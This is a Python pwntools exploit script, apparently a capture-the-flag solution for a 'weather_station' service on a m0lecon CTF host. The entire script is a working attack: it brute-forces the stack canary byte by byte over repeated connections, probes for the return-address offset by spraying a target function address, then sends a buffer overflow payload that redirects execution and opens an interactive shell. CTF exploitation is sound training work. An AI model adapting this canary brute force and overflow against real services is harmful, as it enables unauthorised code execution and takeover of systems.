#!/usr/bin/env python3
from pwn import *
import time

HOST, PORT = "offsec.m0lecon.it", 13560

#found with other code in dir
OFFSET_TO_CANARY = 56
elf = ELF('./weather_station', checksec=False)

ret = 0x000000000040101a

p = remote("offsec.m0lecon.it", 13560)
#gdb.attach(p, gdbscript="""
#set follow-fork-mode child
#set detach-on-fork off
#b read_query
#c
#""")

#lab code for brute forcing canary modified for this program

known = b"\x00"
for i in range(7):

    for bval in range(256):
        guess = known + bytes([bval])
        payload = b"A" * OFFSET_TO_CANARY + guess
        io = remote(HOST, PORT, level='error')
        io.recvuntil(b"location: ")
        io.send(b"here")
        io.recvuntil(b"query: ")
        io.send(payload)
        try:
            data = io.recv(timeout=0.2)
        except EOFError:
            data = b""
        io.close()

        if b"Forecast" in data:
            known = guess
            log.success(f"byte {i+1}: {bval:02x}")
            break

canary = u64(known)
log.info(f"Canary: {canary:#x}")


#send win address a number of times until it works (that is rip offset)
for ripOff in range(192):
    io = remote(HOST, PORT, level='error')
    io.recvuntil(b"location: ")
    io.sendline(b"here")
    io.recvuntil(b"query: ")
    payload = flat(
        b"A" * OFFSET_TO_CANARY,
        p64(canary),
        p64(0x401530) * ripOff)
    io.send(payload)
    time.sleep(0.1)
    try:
        data = io.recv(timeout=0.2)
    except EOFError:
        data = b""
    io.close()

    if b"shell:" in data:
        log.success(f"ripOff:{ripOff}")
        OFFSET_TO_RIP=ripOff-1
        break

io = remote(HOST, PORT)
io.recvuntil(b"location: ")
io.sendline(b"here")
io.recvuntil(b"query: ")
payload = flat(
    b"A"*OFFSET_TO_CANARY, 
    p64(canary),
    b"A"*8*OFFSET_TO_RIP,
    p64(0x401530), 
    p64(ret)
        )
io.send(payload)

#so that the shell does not close immediately
io.sendline(b"/bin/sh -i")
io.interactive()



